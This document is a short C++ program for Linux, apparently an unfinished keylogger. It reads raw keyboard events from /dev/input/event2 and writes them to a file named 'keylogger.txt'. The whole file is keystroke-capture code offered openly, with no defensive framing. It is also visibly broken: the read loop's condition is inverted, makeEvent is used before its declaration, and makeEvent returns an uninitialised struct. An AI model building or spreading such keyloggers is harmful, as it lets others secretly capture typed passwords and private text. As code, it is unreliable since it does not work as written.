#include <iostream>
#include <fstream>
#include <vector>
#include <unistd.h> // linux specific C++ files

struct input_event {        // 24 bytes per package
    struct timeval time;    // 16 bytes
    unsigned short type;    // 2 bytes
    unsigned short code;    // 2 bytes
    unsigned int value;     // 4 bytes
};

void readFile() {
    std::string line;
    std::ifstream keyboardEventFile("/dev/input/event2", std::ios::in | std::ios::binary );

    if (keyboardEventFile.is_open()) {
        std::cout << "Started reading keyboard file" << std::endl;
        std::ofstream logger("keylogger.txt"); // file to write to

        char buffer[24];
        int filePos = 0;

        // process read as input_event
        while (!keyboardEventFile.read(buffer, 24)) {
            //struct input_event newEvent;

            filePos += 24;
            keyboardEventFile.seekg(filePos); // get the next spot to read

            std::cout << "Current buffer: " << buffer << std::endl;
            struct input_event event = makeEvent(buffer);

            // write to output file
            logger.write("New buffer: ", 12);
            logger.write(buffer, 24);
        }
        keyboardEventFile.close();
    };
}

struct input_event makeEvent(char buff[24]) {
    struct input_event newEvent;

    // set the new events values

    return newEvent;
}

int main() {
    readFile();

    return 0;
}